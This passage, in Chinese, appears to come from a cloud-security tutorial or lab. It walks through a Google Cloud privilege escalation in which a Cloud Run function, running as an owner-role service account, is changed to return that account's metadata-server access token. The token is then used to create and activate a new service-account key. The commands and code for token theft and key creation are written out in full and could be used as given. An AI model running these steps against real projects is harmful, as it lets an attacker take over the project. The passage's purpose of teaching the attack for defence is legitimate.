
```bash
mkdir -p token-provider
cd token-provider

touch index.js
touch package.json
```

2. 点击 `Open Editor` 打开 Cloud Shell 编辑器，在此定义 Node.js 依赖项并指定应用程序代码。如果看不到 `token-provider` 目录，请点击刷新资源管理器按钮。

3. 在 Cloud Shell 编辑器中，使用以下代码更新 `index.js` 文件：

```javascript
exports.mainHandler = async (req, res) => {
  res.status(200).send({
    message: `It works!`
  });
};
```

打开并使用以下配置更新 `package.json` 文件：

```json
{
  "name": "secure-function",
  "version": "1.0.0",
  "main": "index.js"
}
```

点击 `Open Terminal` 切换回 CLI，在此可以运行命令。

4. 设置后续部署命令中使用的函数名称：

```bash
FUNCTION_NAME="token-provider"
```

5. 使用具有 `roles/owner` 角色的服务账号 (`superadmin@…​.iam.gserviceaccount.com`) 部署 Cloud 函数：

```bash
REGION="us-east1"

gcloud functions deploy $FUNCTION_NAME \
  --gen2 \
  --runtime=nodejs20 \
  --region=$REGION \
  --source=. \
  --entry-point=mainHandler \
  --service-account=$SA_EMAIL \
  --trigger-http \
  --no-allow-unauthenticated
```

这会产生以下输出：

```
Preparing function...done.
...
Completed with warnings:
  [WARNING] *** Improve build performance by generating
  and committing package-lock.json.
You can view your function in the Cloud Console here: ...

...

url: https://....cloudfunctions.net/token-provider
```

###### Caution

请确保不要意外地向此 Cloud Run 函数授予未经身份验证的访问权限，因为服务账号已配置了 `roles/owner` 角色。

6. 获取已部署 Cloud 函数的 HTTPS 端点：

```bash
FUNCTION_URL=$(gcloud functions describe $FUNCTION_NAME \
  --region=us-east1 \
  --gen2 \
  --format="value(serviceConfig.uri)")

echo $FUNCTION_URL
```

你应该得到以下输出：

```
https://token-provider-....a.run.app
```

7. 向 Cloud Run 函数发出授权请求：

```bash
TOKEN=$(gcloud auth print-identity-token)

curl -H "Authorization: Bearer $TOKEN" $FUNCTION_URL
```

这会产生以下 JSON 响应：

```
{"message":"It works!"}
```

8. 现在你有一个可用的 Cloud Run 函数，是时候修改应用程序代码以检索函数使用的服务账号的访问令牌了。点击 `Open Editor` 并打开 `index.js` 文件。

9. 在 Cloud Shell 编辑器中，更新 `index.js` 文件以从元数据服务器检索服务账号的访问令牌：

```javascript
const {execSync} = require('child_process');

const META_HOST = "http://metadata.google.internal";
const META_PATH = "/computeMetadata/v1/instance";
const SA_PATH   = "/service-accounts/default";
const TOKEN_EP  = "/token";

const FULL_URL = `${META_HOST}${META_PATH}${SA_PATH}${TOKEN_EP}`;

exports.mainHandler = async (req, res) => {
  try {
    const token = execSync(
      `curl -s -H "Metadata-Flavor: Google" "${FULL_URL}"`
    ).toString();

    res.setHeader('Content-Type', 'application/json');
    res.status(200).send(token);
  } catch (err) {
    console.error(err);
    res.status(500).send(err.message);
  }
};
```

点击 `Open Terminal`。

10. 部署 Cloud Run 函数的最新代码更改：

```bash
gcloud functions deploy $FUNCTION_NAME \
  --gen2 \
  --runtime=nodejs20 \
  --region=$REGION \
  --source=. \
  --entry-point=mainHandler \
  --service-account=$SA_EMAIL \
  --trigger-http \
  --no-allow-unauthenticated
```

几分钟后，你应该会看到以下日志消息：

```
Preparing function...done.
...
Completed with warnings:
  [WARNING] *** Improve build performance by generating
  and committing package-lock.json.
  [INFO] A new revision will be deployed serving with 100% traffic.
You can view your function in the Cloud Console here: ...

...

url: https://....cloudfunctions.net/token-provider
```

11. 向 Cloud Run 函数发出授权请求：

```bash
TOKEN=$(gcloud auth print-identity-token)

OUTPUT=$(curl -H "Authorization: Bearer $TOKEN" $FUNCTION_URL)

echo $OUTPUT
```

这会产生以下 JSON 响应：

```
{"access_token":"...","expires_in":...,"token_type":"Bearer"}
```

此从 Cloud Run 函数获取的访问令牌允许攻击者以关联的服务账号 (`superadmin@…​.iam.gservice​ac⁠count.com`) 身份进行身份验证。攻击者可以执行服务账号的 IAM 角色允许的任何操作。由于 `superadmin@…​.iam.gserviceaccount.com` 服务账号已被授予 `roles/owner` 角色，攻击者实际上获得了对项目的完全管理访问权限。

12. 将访问令牌存储在变量 (`SUPERADMIN_ACCESS_TOKEN`) 中：

```bash
SUPERADMIN_ACCESS_TOKEN=$(echo "$OUTPUT" | jq -r '.access_token')
```

13. 将以 `superadmin` 开头的服务账号的电子邮件地址存储在 `SUPERADMIN_EMAIL` 变量中：

```bash
SUPERADMIN_EMAIL="$SA_EMAIL"
```

14. 使用访问令牌生成新的服务账号密钥：

```bash
cd ~

BASE_URL="https://iam.googleapis.com/v1"
PROJECT_PATH="projects/$PROJECT_ID"
SERVICE_ACCOUNT="serviceAccounts/$SUPERADMIN_EMAIL"

curl -s -X POST \
  -H "Authorization: Bearer $SUPERADMIN_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "$BASE_URL/$PROJECT_PATH/$SERVICE_ACCOUNT/keys" \
  -d '{}' \
  | jq -r '.privateKeyData' | base64 --decode > superadmin-key.json
```

你可以通过运行 `cat superadmin-key.json` 来验证 `superadmin-key.json` 是否存在。

15. 使用生成的密钥以具有 `roles/owner` 角色的服务账号身份进行身份验证：

```bash
export SUPERADMIN_CREDENTIALS="superadmin-key.json"
gcloud auth activate-service-account \
  --key-file=$SUPERADMIN_CREDENTIALS

PROJECT_ID=$(cat superadmin-key.json | jq -r ".project_id")
gcloud config set project $PROJECT_ID
```

这会给出以下输出：

```
Activated service account credentials for:
 [superadmin@....iam.gserviceaccount.com]

Updated property [core/project].
```

###### Note

权限提升并不总是能让攻击者获得完全的 owner 级别访问权限。他们可以执行的操作仅限于被攻破的服务账号所分配的权限。

16. 运行以下命令列出所有已通过身份验证的 `gcloud` 账号：

```bash
gcloud auth list
```

这会产生以下输出：

```
Credentialed Accounts

...

ACTIVE:
ACCOUNT: html-to-pdf@....iam.gserviceaccount.com

ACTIVE: *
ACCOUNT: superadmin@....iam.gserviceaccount.com

To set the active account, run:
    $ gcloud config set account `ACCOUNT`
```

在此，`superadmin@…​.iam.gserviceaccount.com` 账号当前处于活动状态，如 `ACTIVE` 列中的 `*` 所示。

17. 检查分配给服务账号的 IAM 角色，以验证其是否关联了 `roles/owner` 角色：

```bash
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$SUPERADMIN_EMAIL"
```

这会产生以下响应：

